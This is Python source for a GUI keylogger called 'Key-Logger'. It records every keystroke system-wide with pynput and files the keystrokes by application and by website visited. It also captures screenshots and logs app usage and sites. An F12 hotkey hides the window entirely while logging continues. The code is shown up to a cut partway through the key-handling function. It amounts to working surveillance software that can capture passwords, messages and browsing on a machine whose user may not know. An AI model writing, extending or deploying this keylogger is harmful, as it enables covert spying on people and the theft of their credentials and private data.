import tkinter as tk
from tkinter import filedialog, ttk, messagebox, scrolledtext
from pynput import keyboard, mouse
import os
import sys
import time
import threading
import datetime
import subprocess
import re
import json
import hashlib
from collections import defaultdict, deque
from typing import Dict, List, Tuple, Optional
from pathlib import Path
import queue

try:
    from PIL import Image, ImageGrab, ImageTk
except ImportError: 
    ImageGrab = None
    ImageTk = None


try:
    if sys.platform == "win32":  
        import win32gui
        import win32process
        import psutil
except ImportError:
    pass


THEME = {
    "name": "White",
    "bg": "#ffffff",
    "fg": "#212529",
    "accent": "#0d6efd",
    "panel": "#ffffff",
    "button_bg": "#e9ecef",
    "button_fg": "#212529",
    "entry_bg": "#ffffff",
    "entry_fg": "#212529",
    "status_active": "#198754",
    "status_paused": "#ffc107",
    "status_idle": "#6c757d",
    "system_color": "#6c757d",
    "keyboard_color": "#0d6efd",
    "clipboard_color": "#6610f2",
    "web_color": "#fd7e14"
}


STOKES_ROOT = "Stokes"
KEY_STOKER_DIR = "Key-Stoker"
WEB_LOGS_DIR = "Web-Keylogs"
SYS_APPS_DIR = "System-Applications"
SCREENSHOTS_DIR = "Screenshots"

LOG_FONTS = ["Consolas", "Monaco", "Courier New", "monospace"]
UI_FONTS = ["Segoe UI", "San Francisco", "Helvetica Neue", "Arial", "sans-serif"]


def get_best_font(candidates: List[str], fallback:  str, size: int = 10) -> Tuple[str, int]:
    try:
        from tkinter import font as tkfont
        available_families = set(tkfont.families())
        for candidate in candidates:
            if candidate in available_families:
                return (candidate, size)
    except Exception:
        pass
    return (fallback, size)


def resource_path(relative_path: str) -> str:
    try:
        base_path = sys._MEIPASS
    except AttributeError:
        base_path = os.path.abspath(".")
    return os.path. join(base_path, relative_path)


def sanitize_filename(name: str) -> str:
    if not name:
        return "Unknown"
    cleaned = ''.join(c for c in name if c.isalnum() or c in (' ', '_', '-')).strip()
    cleaned = cleaned.replace(" ", "_")
    if not cleaned:
        return "Unknown"
    return cleaned[: 100]


def normalize_process_name(process_name: str) -> str:
    cleaned = process_name.strip()
    if cleaned.lower().endswith('.exe'):
        cleaned = cleaned[:-4]
    return cleaned


class ProcessDetector:
    @staticmethod
    def get_active_process_info() -> Tuple[str, str]: 
        try:
            if sys.platform == "win32": 
                try:
                    import win32gui
                    import win32process
                    import psutil
                    hwnd = win32gui.GetForegroundWindow()
                    window_text = win32gui.GetWindowText(hwnd)
                    _, pid = win32process.GetWindowThreadProcessId(hwnd)
                    try:
                        process = psutil.Process(pid)
                        raw_name = normalize_process_name(process.name())
                        
                        lower_name = raw_name.lower()
                        process_name = raw_name 
                        
                       
                        if 'chrome' in lower_name: process_name = "Google Chrome"
                        elif 'firefox' in lower_name: process_name = "Firefox"
                        elif 'msedge' in lower_name: process_name = "Microsoft Edge"
                        elif 'brave' in lower_name: process_name = "Brave"
                        elif 'opera' in lower_name or 'launcher' in lower_name:
                            if "opera" in lower_name or "opera" in str(window_text).lower():
                                process_name = "Opera"
                        elif 'safari' in lower_name: process_name = "Safari"

                        
                        elif lower_name == "applicationframehost":
                            if window_text and window_text != "Unknown":
                                process_name = window_text.replace(" ", "")
                            else:
                                process_name = "WindowsSystemApp"
                        elif lower_name == "systemsettings": process_name = "WindowsSettings"
                        elif lower_name == "explorer":
                            if window_text and window_text != "Program Manager":
                                process_name = "FileExplorer"
                            else:
                                process_name = "WindowsShell"
                        elif lower_name == "mspaint": process_name = "Paint"
                        elif lower_name == "excel": process_name = "MicrosoftExcel"
                        elif lower_name == "winword": process_name = "MicrosoftWord"
                        elif lower_name == "powerpnt": process_name = "PowerPoint"
                        elif lower_name == "onenote": process_name = "OneNote"
                        elif lower_name == "notepad": process_name = "Notepad"
                        elif lower_name == "calc": process_name = "Calculator"

                    except: 
                        process_name = "Unknown"
                    return (process_name, window_text if window_text else "Unknown")
                except Exception:
                    return ("Unknown", "Unknown")
            elif sys. platform == "darwin":
                try:
                    from AppKit import NSWorkspace
                    active_app = NSWorkspace.sharedWorkspace().frontmostApplication()
                    app_name = active_app.localizedName() if active_app else "Unknown"
                    return (app_name, app_name)
                except Exception: 
                    return ("Unknown", "Unknown")
            else:
                try:
                    result = subprocess.run(['xprop', '-root', '_NET_ACTIVE_WINDOW'],
                                          capture_output=True, text=True, timeout=1)
                    window_id = result.stdout.strip().split()[-1]
                    result = subprocess.run(['xprop', '-id', window_id, 'WM_CLASS'],
                                          capture_output=True, text=True, timeout=1)
                    wm_class = result.stdout. split('"')[1] if '"' in result.stdout else "Unknown"
                    result = subprocess.run(['xprop', '-id', window_id, 'WM_NAME'],
                                          capture_output=True, text=True, timeout=1)
                    window_name = result.stdout.split('"', 1)[1].rsplit('"', 1)[0]
                    return (wm_class, window_name)
                except Exception:
                    return ("Unknown", "Unknown")
        except Exception:
            return ("Unknown", "Unknown")


class SystemAppDetector:
    WINDOWS_SYSTEM_APPS = [
        'SystemSettings', 'WindowsSettings', 'ApplicationFrameHost', 'SearchApp', 'StartMenuExperienceHost',
        'ShellExperienceHost', 'explorer', 'FileExplorer', 'WindowsShell', 'taskmgr', 'mmc', 'control', 
        'Registry', 'regedit', 'services', 'eventvwr', 'perfmon', 'msconfig', 'WindowsUpdateBox',
        'cmd', 'powershell', 'WindowsTerminal', 'conhost', 'RuntimeBroker',
        'SearchUI', 'SearchHost', 'SettingsHost', 'SystemSettingsBroker',
        'WindowsSystemApp', 'Paint', 'MicrosoftExcel', 'MicrosoftWord', 'PowerPoint', 'OneNote', 
        'Notepad', 'Calculator'
    ]

    @staticmethod
    def is_system_app(process_name: str) -> bool:
        if process_name in SystemAppDetector.WINDOWS_SYSTEM_APPS:
            return True
        process_lower = process_name.lower()
        for sys_app in SystemAppDetector.WINDOWS_SYSTEM_APPS:
            if sys_app.lower() == process_lower:
                return True
        return False


class BrowserDetector:
    BROWSER_NAMES = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera', 'Brave', 'Internet Explorer']

    @staticmethod
    def is_browser(process_name: str) -> bool:
        return any(browser in process_name for browser in BrowserDetector.BROWSER_NAMES)

    @staticmethod
    def extract_site_name(window_title: str) -> Optional[str]:
        if not window_title or not window_title.strip():
            return None
        
        title_clean = window_title.strip()
        
        if title_clean.lower() in ['new tab', 'newtab', 'about:blank', '']:
            return "NewTab"
        
        domain = BrowserDetector.extract_domain(window_title)
        if domain:
            if 'www.' in domain:
                domain = domain.split('www.')[1]
            return sanitize_filename(domain.split('.')[0])

        separators = [' - ', ' — ', ' | ', ' – ', ' : ']
        for sep in separators: 
            if sep in title_clean: 
                parts = title_clean.split(sep)
                for part in parts:
                    part_clean = part.strip()
                    if any(b in part_clean for b in BrowserDetector.BROWSER_NAMES):
                        continue
                    if len(part_clean) > 0:
                        return sanitize_filename(part_clean[:50])
        
        return sanitize_filename(title_clean[:50])

    @staticmethod
    def extract_domain(window_title: str) -> Optional[str]:
        patterns = [
            r'https?://([^\s/]+)',
            r'([a-zA-Z0-9-]+\.[a-zA-Z]{2,})'
        ]
        for pattern in patterns:
            match = re.search(pattern, window_title)
            if match: 
                return match.group(1)
        return None


class ScreenshotManager:
    def __init__(self, base_folder: str):
        self.base_folder = Path(base_folder)
        self.lock = threading.Lock()
        self.screenshot_count = 0 

    def can_take_screenshot(self) -> bool:
        return True

    def take_screenshot(self, process_name: str, trigger:  str):
        if not self.can_take_screenshot():
            return
        if ImageGrab is None:
            return
        try:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            filename = self.base_folder / f"{trigger}_{timestamp}.png"
            screenshot = ImageGrab.grab()
            screenshot.save(filename)
            with self.lock:
                self.screenshot_count += 1
        except Exception:
            pass


class AppLogger:
    def __init__(self, web_logs_root: str, sys_apps_root: str):
        self.web_logs_root = Path(web_logs_root)
        self.sys_apps_root = Path(sys_apps_root)
        self.buffer = defaultdict(list)
        self.buffer_lock = threading.Lock()
        self.flush_interval = 5.0
        self.last_flush = time.time()

        self.web_logs_root.mkdir(parents=True, exist_ok=True)
        self.sys_apps_root.mkdir(parents=True, exist_ok=True)

    def log_keyboard(self, process_name: str, keys: str):
        pass 

    def log_browser_visit(self, process_name: str, site_name: str, keys: str):
        timestamp = datetime.datetime.now().strftime('%H:%M:%S')
        entry = f"[{timestamp}] {keys}\n"
        with self. buffer_lock:
            self.buffer[f"Web:{process_name}:{site_name}"].append(entry)

    def log_system_app(self, app_name: str, keys: str):
        timestamp = datetime.datetime.now().strftime('%H:%M:%S')
        entry = f"[{timestamp}] {keys}\n"
        with self.buffer_lock:
            self.buffer[f"System:{app_name}"].append(entry)

    def should_flush(self) -> bool:
        return (time.time() - self.last_flush) >= self.flush_interval

    def flush(self):
        with self.buffer_lock:
            for key, entries in list(self.buffer.items()):
                if not entries:
                    continue
                
                parts = key.split(":")
                category = parts[0]
                
                if category == "System":
                    app_name = parts[1]
                    self._flush_system_app(app_name, entries)
                elif category == "Web":
                    browser_name = parts[1]
                    site_name = parts[2]
                    self._flush_browser_visit(browser_name, site_name, entries)
            
            self.buffer.clear()
            self.last_flush = time.time()

    def _flush_system_app(self, app_name: str, entries: List[str]):
        try:
            safe_name = sanitize_filename(app_name)
            log_file = self.sys_apps_root / f"{safe_name}.txt"
            with open(log_file, 'a', encoding='utf-8') as f:
                f.writelines(entries)
        except Exception:
            pass

    def _flush_browser_visit(self, browser_name: str, site_name: str, entries: List[str]):
        try:
            safe_browser = sanitize_filename(browser_name)
            safe_site = sanitize_filename(site_name)
            
            browser_folder = self.web_logs_root / safe_browser
            browser_folder.mkdir(parents=True, exist_ok=True)
            
            log_file = browser_folder / f"{safe_site}.txt"
            with open(log_file, 'a', encoding='utf-8') as f:
                f.writelines(entries)
        except Exception:
            pass


class UsageTracker:
    def __init__(self):
        self.app_times = defaultdict(float)
        self.current_app = None
        self. current_start = None
        self.lock = threading.Lock()

    def switch_app(self, process_name: str):
        with self.lock:
            now = time.time()
            if self.current_app and self.current_start:
                duration = now - self.current_start
                self.app_times[self.current_app] += duration
            self.current_app = process_name
            self.current_start = now

    def save_usage(self):
        with self.lock:
            if self.current_app and self.current_start:
                duration = time.time() - self.current_start
                self.app_times[self.current_app] += duration
                self.current_start = time.time() 


class KeystrokeCompressor:
    def __init__(self):
        self.last_key = None
        self.repeat_count = 0

    def compress(self, key: str) -> Optional[Tuple[str, int]]: 
        if key == self.last_key:
            self.repeat_count += 1
            return None
        else:
            result = None
            if self.last_key and self.repeat_count > 1:
                result = (self.last_key, self.repeat_count)
            self.last_key = key
            self. repeat_count = 1
            return result


class SessionStats:
    def __init__(self):
        self.start_time = time.time()
        self.keystroke_count = 0
        self.lock = threading.Lock()
        self.last_minute_keystrokes = deque(maxlen=60)

    def add_keystroke(self):
        with self.lock:
            self.keystroke_count += 1
            self.last_minute_keystrokes.append(time.time())

    def get_keys_per_minute(self) -> float:
        with self.lock:
            now = time.time()
            recent = [t for t in self.last_minute_keystrokes if now - t <= 60]
            return len(recent)


class IdleDetector:
    def __init__(self, idle_threshold: float = 60.0):
        self.idle_threshold = idle_threshold
        self.last_activity = time. time()
        self.was_idle = False
        self.idle_count = 0 
        self.lock = threading.Lock()

    def activity(self) -> bool:
        with self. lock:
            self.last_activity = time.time()
            was_idle = self.was_idle
            self.was_idle = False
            return was_idle

    def check_idle(self) -> bool:
        with self.lock:
            idle_time = time.time() - self.last_activity
            is_idle = idle_time >= self.idle_threshold
            if is_idle and not self.was_idle:
                self.was_idle = True
                self.idle_count += 1 
                return True
            return False


class ActivityLogger:
    def __init__(self, root_window):
        self.root = root_window
        self.theme = THEME

        self.is_logging = False
        self.is_paused = False
        self.is_hidden = False

        if getattr(sys, 'frozen', False):
            base_path = os.path.dirname(sys.executable)
        else:
            base_path = os.path.dirname(os.path.abspath(__file__))
        self.root_log_dir = Path(base_path) / STOKES_ROOT
        
        self.screenshot_manager = None
        self.app_logger = None
        self.usage_tracker = None
        
        self.session_stats = SessionStats()
        self.idle_detector = IdleDetector(idle_threshold=60.0)
        self.compressor = KeystrokeCompressor()

        self.context_lock = threading.Lock()
        self.current_process = None
        self.current_window = None
        self.current_site = None
        self.keystroke_buffer = []
        
        self.unique_websites = set()
        self.unknown_app_count = 0
        self.system_apps_detected = set()

        self.stop_event = threading.Event()
        self.shutdown_event = threading.Event()

        self.keyboard_listener = None
        self.mouse_listener = None
        self.hotkey_listener = None

        self.log_queue = queue.Queue(maxsize=2000)
        self.ui_update_queue = queue.Queue(maxsize=100)

        self.icon_images = {}

        self.load_icons()
        self.setup_gui()
        self.apply_theme()

        self.start_hotkey_listener()
        self.start_background_tasks()

        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.process_ui_updates()

    def setup_loggers_and_paths(self):
        try:
            key_stoker_path = self.root_log_dir / KEY_STOKER_DIR
            
            web_logs_path = key_stoker_path / WEB_LOGS_DIR
            sys_apps_path = key_stoker_path / SYS_APPS_DIR
            screenshots_path = key_stoker_path / SCREENSHOTS_DIR

            web_logs_path.mkdir(parents=True, exist_ok=True)
            sys_apps_path.mkdir(parents=True, exist_ok=True)
            screenshots_path.mkdir(parents=True, exist_ok=True)

            self.screenshot_manager = ScreenshotManager(str(screenshots_path))
            self.app_logger = AppLogger(str(web_logs_path), str(sys_apps_path))
            self.usage_tracker = UsageTracker()
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to create folders: {e}")
            self.stop_logging()

    def load_icons(self):
        if ImageTk is None:
            return
        icon_files = {
            'main': 'assets/main.png',
            'start': 'assets/start.png',
            'pause': 'assets/pause.png',
            'stop': 'assets/stop.png',
            'hide': 'assets/hide.png',
            'search': 'assets/search.png',
            'screenshot': 'assets/screenshot.png',
            'folder': 'assets/folder.png'
        }
        for key, path in icon_files.items():
            try:
                full_path = resource_path(path)
                if os.path.exists(full_path):
                    img = Image.open(full_path)
                    if key == 'main':
                        img = img.resize((400, 190), Image.Resampling.LANCZOS)
                    else:
                        img = img. resize((52, 52), Image.Resampling.LANCZOS)
                    self.icon_images[key] = ImageTk. PhotoImage(img)
            except Exception:
                pass
        try:
            icon_path = resource_path('assets/app. ico')
            if os.path.exists(icon_path):
                self.root.iconbitmap(icon_path)
        except Exception:
            pass

    def setup_gui(self):
        self.root. title("𝒦𝑒𝓎-𝐿𝑜𝑔𝑔𝑒𝓇")
        self.root.geometry("1920x1080")
        self.root.state("zoomed")   # Windows fullscreen (taskbar ke saath)


        ui_font = get_best_font(UI_FONTS, "Segoe UI", 9)
        heading_font = get_best_font(UI_FONTS, "Segoe UI Semibold", 11)
        log_font = get_best_font(LOG_FONTS, "Cascadia Mono", 9)



        self.main_container = tk.Frame(self.root)
        self.main_container.pack(fill=tk.BOTH, expand=True)

        self.header_frame = tk.Frame(self.main_container)
        self.header_frame. pack(side=tk.TOP, fill=tk.X, padx=25, pady=(20, 10))

        if 'main' in self.icon_images:
            logo_container = tk.Frame(self.header_frame)
            logo_container.pack(side=tk.TOP)
            self.logo_label = tk.Label(logo_container, image=self.icon_images['main'])
            self.logo_label.pack()

        title_status_frame = tk.Frame(self. header_frame)
        title_status_frame.pack(side=tk.TOP, fill=tk. X, pady=(10, 0))

        self.title_label = tk.Label(title_status_frame, text="ꜱᴛᴀᴛᴜꜱ", font=heading_font, anchor="w")
        self.title_label.pack(side=tk. LEFT)

        status_frame = tk.Frame(title_status_frame)
        status_frame.pack(side=tk.LEFT, padx=20)

        self.status_indicator = tk.Canvas(status_frame, width=16, height=16, highlightthickness=0)
        self.status_indicator.pack(side=tk.LEFT, padx=(0, 8))
        self.status_circle = self.status_indicator.create_oval(2, 2, 14, 14, fill="#6c757d", outline="")

        self.status_label = tk.Label(status_frame, text="Idle", font=ui_font, anchor="w")
        self.status_label.pack(side=tk.LEFT)

        self.control_frame = tk.Frame(self.main_container)
        self.control_frame.pack(side=tk.TOP, fill=tk.X, padx=25, pady=15)
        
        self.button_container = tk.Frame(self.control_frame)
        self.button_container.pack(side=tk.TOP, anchor=tk.CENTER)

        button_style = {'font': ui_font, 'relief': tk.FLAT, 'cursor': 'hand2', 'borderwidth': 0, 'highlightthickness': 0, 'padx': 16, 'pady': 10}

        if 'start' in self.icon_images:
            self.start_button = tk.Button(self.button_container, image=self.icon_images['start'], command=self.start_logging, **button_style)
        else:
            self.start_button = tk.Button(self.button_container, text="▶", command=self.start_logging, **button_style)
        self.start_button.pack(side=tk.LEFT, padx=6)
        self.create_tooltip(self.start_button, "Start Logging")

        if 'pause' in self.icon_images:
            self.pause_button = tk.Button(self.button_container, image=self.icon_images['pause'], command=self. pause_logging, state=tk.DISABLED, **button_style)
        else:
            self.pause_button = tk.Button(self.button_container, text="⏸", command=self.pause_logging, state=tk.DISABLED, **button_style)
        self.pause_button.pack(side=tk.LEFT, padx=6)
        self.create_tooltip(self.pause_button, "Pause Logging")

        if 'stop' in self.icon_images:
            self.stop_button = tk.Button(self.button_container, image=self. icon_images['stop'], command=self.stop_logging, state=tk.DISABLED, **button_style)
        else:
            self.stop_button = tk.Button(self.button_container, text="■", command=self.stop_logging, state=tk.DISABLED, **button_style)
        self.stop_button.pack(side=tk.LEFT, padx=6)
        self.create_tooltip(self.stop_button, "Stop Logging")

        self.separator = tk.Frame(self.button_container, width=2, height=36)
        self.separator.pack(side=tk.LEFT, padx=12)

        if 'hide' in self.icon_images:
            self.hide_button = tk.Button(self.button_container, image=self.icon_images['hide'], command=self.toggle_visibility, **button_style)
        else:
            self. hide_button = tk.Button(self.button_container, text="👁", command=self.toggle_visibility, **button_style)
        self.hide_button.pack(side=tk.LEFT, padx=6)
        self.create_tooltip(self.hide_button, "Hide Window (F12)")

        if 'screenshot' in self.icon_images:
            self.screenshot_button = tk.Button(self.button_container, image=self.icon_images. get('screenshot'), command=self.take_screenshot_manual, **button_style)
        else:
            self.screenshot_button = tk.Button(self.button_container, text="📸", command=self.take_screenshot_manual, **button_style)
        self.screenshot_button.pack(side=tk.LEFT, padx=6)
        self.create_tooltip(self. screenshot_button, "Take Screenshot")

        if 'folder' in self.icon_images:
            self.open_folder_button = tk.Button(self.button_container, image=self.icon_images. get('folder'), command=self.open_log_folder, **button_style)
        else:
            self. open_folder_button = tk. Button(self.button_container, text="📁", command=self.open_log_folder, **button_style)
        self.open_folder_button.pack(side=tk.LEFT, padx=6)
        self.create_tooltip(self. open_folder_button, "Open Log Folder")

        self.content_frame = tk.Frame(self.main_container)
        self.content_frame.pack(side=tk.TOP, fill=tk.BOTH, expand=True, padx=25, pady=10)

        preview_header = tk.Frame(self.content_frame)
        preview_header. pack(side=tk.TOP, fill=tk.X, pady=(0, 10))

        self.preview_label = tk. Label(preview_header, text="ᴀᴄᴛɪᴠɪᴛʏ ᴘʀᴇᴠɪᴇᴡ", font=heading_font, anchor="w")
        self.preview_label.pack(side=tk.LEFT)

        self.preview_text = scrolledtext.ScrolledText(self.content_frame, font=log_font, wrap=tk.WORD, state=tk.DISABLED,
                                                       relief=tk.FLAT, padx=12, pady=12, spacing1=2, spacing2=1, spacing3=2)
        self.preview_text.pack(side=tk.TOP, fill=tk.BOTH, expand=True)

        self.preview_text.tag_config("system", foreground="#6c757d")
        self.preview_text.tag_config("keyboard", foreground="#0d6efd")
        self.preview_text.tag_config("web", foreground="#fd7e14")
        self.preview_text.tag_config("timestamp", foreground="#6c757d", font=(log_font[0], 8))

        self.search_frame = tk.Frame(self.content_frame)
        self.search_frame.pack(side=tk.TOP, fill=tk.X, pady=(12, 0))

        tk.Label(self.search_frame, text="Search:", font=ui_font).pack(side=tk.LEFT, padx=(0, 10))

        self.search_entry = tk.Entry(self.search_frame, font=ui_font)
        self.search_entry. pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        self.search_entry.bind('<Return>', lambda e: self.search_logs())

        if 'search' in self.icon_images:
            self.search_button = tk.Button(self.search_frame, image=self.icon_images['search'], command=self.search_logs,
                                            relief=tk.FLAT, borderwidth=0, highlightthickness=0, cursor='hand2', padx=10, pady=6)
        else:
            self.search_button = tk.Button(self.search_frame, text="🔍", command=self.search_logs, font=ui_font,
                                            relief=tk. FLAT, borderwidth=0, highlightthickness=0, cursor='hand2', padx=12, pady=6)
        self.search_button.pack(side=tk.LEFT)

        self.footer_frame = tk.Frame(self.main_container, height=35)
        self.footer_frame.pack(side=tk. BOTTOM, fill=tk.X, padx=25, pady=(10, 20))

        self.stats_label = tk.Label(self.footer_frame, text="Keys/min:  0 | Time: 0m", font=ui_font, anchor="w")
        self.stats_label.pack(side=tk.LEFT, fill=tk.X, expand=True)

    def create_tooltip(self, widget, text):
        def on_enter(event):
            tooltip = tk.Toplevel()
            tooltip.wm_overrideredirect(True)
            tooltip.wm_geometry(f"+{event.x_root+10}+{event.y_root+10}")
            label = tk.Label(tooltip, text=text, background="#2d323e", foreground="#e4e6eb", relief=tk.FLAT, padx=8, pady=4, font=("Arial", 9))
            label.pack()
            widget.tooltip = tooltip

        def on_leave(event):
            if hasattr(widget, 'tooltip'):
                widget.tooltip.destroy()
                del widget.tooltip

        widget.bind('<Enter>', on_enter)
        widget.bind('<Leave>', on_leave)

    def apply_theme(self):
        theme = self.theme
        self.root.configure(bg=theme["bg"])
        self.main_container.configure(bg=theme["bg"])
        self.header_frame.configure(bg=theme["bg"])
        if hasattr(self, 'logo_label'):
            self.logo_label.configure(bg=theme["bg"])
            self.logo_label.master.configure(bg=theme["bg"])
        self.title_label.configure(bg=theme["bg"], fg=theme["fg"])
        self.status_label.configure(bg=theme["bg"], fg=theme["fg"])
        self.control_frame.configure(bg=theme["bg"])
        
        if hasattr(self, 'button_container'):
            self.button_container.configure(bg=theme["bg"])
        if hasattr(self, 'separator'):
            self.separator.configure(bg=theme["status_idle"])
            
        self.content_frame.configure(bg=theme["bg"])
        self.preview_label.configure(bg=theme["bg"], fg=theme["fg"])
        self.search_frame.configure(bg=theme["bg"])
        self.footer_frame.configure(bg=theme["bg"])
        self.stats_label.configure(bg=theme["bg"], fg=theme["fg"])
        self.status_indicator.configure(bg=theme["bg"])
        self.preview_text.configure(bg=theme["panel"], fg=theme["fg"], insertbackground=theme["accent"])
        self.preview_text.tag_config("system", foreground=theme. get("system_color", theme["fg"]))
        self.preview_text.tag_config("keyboard", foreground=theme.get("keyboard_color", theme["accent"]))
        self.preview_text.tag_config("web", foreground=theme.get("web_color", theme["accent"]))
        self.preview_text. tag_config("timestamp", foreground=theme.get("system_color", theme["fg"]))
        
        button_configs = {
            'bg': theme["bg"], 
            'fg': theme["button_fg"], 
            'activebackground': theme["bg"], 
            'activeforeground': theme["button_fg"],
            'highlightthickness': 0,
            'bd': 0
        }
        
        for button in [self.start_button, self. pause_button, self.stop_button, self.hide_button, self.screenshot_button,
                       self.open_folder_button, self.search_button]:
            button.configure(**button_configs)
            
        entry_configs = {'bg': theme["entry_bg"], 'fg':  theme["entry_fg"], 'insertbackground': theme["accent"], 'relief': tk.FLAT}
        self.search_entry.configure(**entry_configs)
        for widget in self.search_frame.winfo_children():
            if isinstance(widget, tk.Label):
                widget.configure(bg=theme["bg"], fg=theme["fg"])

    def update_status_indicator(self):
        if self.is_logging and not self.is_paused:
            color = self.theme["status_active"]
            status_text = "Logging"
        elif self.is_paused:
            color = self.theme["status_paused"]
            status_text = "Paused"
        else:
            color = self.theme["status_idle"]
            status_text = "Idle"
        self.status_indicator.itemconfig(self.status_circle, fill=color)
        self.status_label.configure(text=status_text)

    def start_background_tasks(self):
        threading.Thread(target=self.buffer_flusher_task, daemon=True, name="BufferFlusher").start()
        threading.Thread(target=self.idle_monitor_task, daemon=True, name="IdleMonitor").start()
        threading.Thread(target=self.stats_updater_task, daemon=True, name="StatsUpdater").start()
        threading.Thread(target=self.usage_saver_task, daemon=True, name="UsageSaver").start()

    def buffer_flusher_task(self):
        while not self.shutdown_event.is_set():
            try:
                if self.is_logging and not self.is_paused:
                    if self.app_logger and self.app_logger.should_flush():
                        self.app_logger.flush()
            except Exception:
                pass
            self.shutdown_event.wait(1)

    def idle_monitor_task(self):
        while not self.shutdown_event.is_set():
            try:
                if self.is_logging and not self.is_paused:
                    if self.idle_detector.check_idle():
                        log_entry = "[SYSTEM] Idle detected"
                        self.add_log_entry(log_entry, "system")
            except Exception:
                pass
            self.shutdown_event.wait(5)

    def stats_updater_task(self):
        while not self.shutdown_event.is_set():
            try:
                if self.is_logging and not self.is_paused:
                    kpm = self.session_stats.get_keys_per_minute()
                    elapsed = time.time() - self.session_stats.start_time
                    stats_text = f"Keys/min: {kpm:.0f} | Time: {elapsed / 60:.1f}m"
                    self.queue_ui_update(lambda t=stats_text: self.stats_label.configure(text=t))
            except Exception:
                pass
            self.shutdown_event.wait(2)

    def usage_saver_task(self):
        while not self.shutdown_event.is_set():
            try:
                if self.is_logging and self.usage_tracker:
                    self.usage_tracker.save_usage()
            except Exception:
                pass
            self.shutdown_event.wait(30)

    def start_hotkey_listener(self):
        def on_hotkey_press(key):
            try:
                key_str = str(key).replace("Key.", "").lower()
                if key_str == "f12":
                    self.queue_ui_update(self.toggle_visibility)
                elif key_str == "f11":
                    self.queue_ui_update(self.pause_logging)
            except Exception:
                pass
        try:
            self.hotkey_listener = keyboard.Listener(on_press=on_hotkey_press)
            self.hotkey_listener.start()
        except Exception:
            pass

    def start_logging(self):
        if self.is_logging:
            return
        
        # NOTE: self.root_log_dir is already set in __init__
        try:
            self.root_log_dir.mkdir(parents=True, exist_ok=True)
            self.setup_loggers_and_paths()
        except Exception as e:
            messagebox.showerror("Error", f"Could not create Stokes folder:\n{e}")
            return

        self.is_logging = True
        self.is_paused = False
        
        self.current_process = None
        self.current_site = None
        self.current_window = None
        self.unique_websites.clear() 
        self.unknown_app_count = 0
        self.system_apps_detected.clear()
        
        self.stop_event.clear()
        self.session_stats = SessionStats()
        self.start_button.configure(state=tk.DISABLED)
        self.pause_button. configure(state=tk.NORMAL)
        self.stop_button.configure(state=tk. NORMAL)
        self.update_status_indicator()
        threading.Thread(target=self.keyboard_logging_task, daemon=True, name="KeyboardLogger").start()
        threading.Thread(target=self.mouse_logging_task, daemon=True, name="MouseLogger").start()

    def stop_logging(self):
        if not self.is_logging:
            return
        self.is_logging = False
        self.is_paused = False
        self.stop_event.set()
        self.commit_buffer()
        if self.app_logger:
            self.app_logger.flush()
        if self.usage_tracker:
            self.usage_tracker.save_usage()
        if self.keyboard_listener:
            try:
                self.keyboard_listener.stop()
            except Exception:
                pass
        if self. mouse_listener:
            try: 
                self.mouse_listener. stop()
            except Exception: 
                pass
        
        self.generate_session_summary()

        self.start_button.configure(state=tk.NORMAL)
        self.pause_button.configure(state=tk.DISABLED)
        self.stop_button.configure(state=tk.DISABLED)
        self.update_status_indicator()

    def generate_session_summary(self):
        if not self.root_log_dir or not self.session_stats:
            return

        try:
            summary_path = self.root_log_dir / "main_summary.txt"
            end_time = datetime.datetime.now()
            start_time = datetime.datetime.fromtimestamp(self.session_stats.start_time)
            duration = end_time - start_time
            
            duration_minutes = duration.total_seconds() / 60.0
            total_keys = self.session_stats.keystroke_count
            avg_kpm = total_keys / duration_minutes if duration_minutes > 0 else 0

            with open(summary_path, 'w', encoding='utf-8') as f:
                f.write("========================================\n")
                f.write("    ACTIVITY LOGGER - SESSION SUMMARY\n")
                f.write("========================================\n\n")
                
                f.write(f"Start Time:       {start_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"End Time:         {end_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total Duration:   {str(duration).split('.')[0]}\n\n")
                
                f.write("[STATS]\n")
                f.write(f"Total Keystrokes:      {total_keys}\n")
                f.write(f"Screenshot Count:      {self.screenshot_manager.screenshot_count if self.screenshot_manager else 0}\n")
                f.write(f"System Apps Detected:  {len(self.system_apps_detected)}\n")
                f.write(f"Unknown/Errors Count:  {self.unknown_app_count}\n\n")

                f.write("[APPLICATIONS USED]\n")
                if self.usage_tracker and self.usage_tracker.app_times:
                    # Sort by duration descending
                    sorted_apps = sorted(self.usage_tracker.app_times.items(), key=lambda x: x[1], reverse=True)
                    for app, seconds in sorted_apps:
                        m, s = divmod(seconds, 60)
                        h, m = divmod(m, 60)
                        time_str = f"{int(h)}h {int(m)}m {int(s)}s"
                        f.write(f"- {app:<30} {time_str}\n")
                else:
                    f.write("- No application usage recorded.\n")
                
                f.write("\n[WEBSITES VISITED]\n")
                if self.unique_websites:
                    for site in sorted(self.unique_websites):
                        f.write(f"- {site}\n")
                else:
                    f.write("- No websites recorded.\n")
                
                f.write("\n========================================\n")
        except Exception as e:
            print(f"Error generating summary: {e}")

    def pause_logging(self):
        if not self.is_logging:
            return
        self.is_paused = not self.is_paused
        self.update_status_indicator()

    def toggle_visibility(self):
        self.is_hidden = not self. is_hidden
        if self.is_hidden:
            self.root.withdraw()
        else:
            self.root.deiconify()
            self.root.lift()
            self.root.focus_force()

    def keyboard_logging_task(self):
        def on_key_press(key):
            if not self.is_logging or self.is_paused:
                return
            try:
                process_name, window_title = ProcessDetector.get_active_process_info()
                
                if process_name == "Unknown":
                    self.unknown_app_count += 1
                
                if SystemAppDetector.is_system_app(process_name):
                    self.system_apps_detected.add(process_name)

                with self.context_lock:
                    context_changed = False
                    new_site = None
                    
                    if process_name != self.current_process:
                        context_changed = True
                    elif BrowserDetector.is_browser(process_name):
                        new_site = BrowserDetector.extract_site_name(window_title)
                        if new_site != self.current_site:
                            context_changed = True
                    elif window_title != self.current_window:
                        context_changed = True
                    
                    if context_changed:
                        self.commit_buffer_internal(self.current_process, self.current_site)
                        self.current_process = process_name
                        self.current_window = window_title
                        if BrowserDetector.is_browser(process_name):
                            self.current_site = new_site
                        else:
                            self.current_site = None
                        self. handle_app_change(process_name, window_title)
                
                was_idle = self.idle_detector.activity()
                if was_idle: 
                    log_entry = "[SYSTEM] Activity resumed"
                    self.add_log_entry(log_entry, "system")
                
                key_str = self.process_key(key)
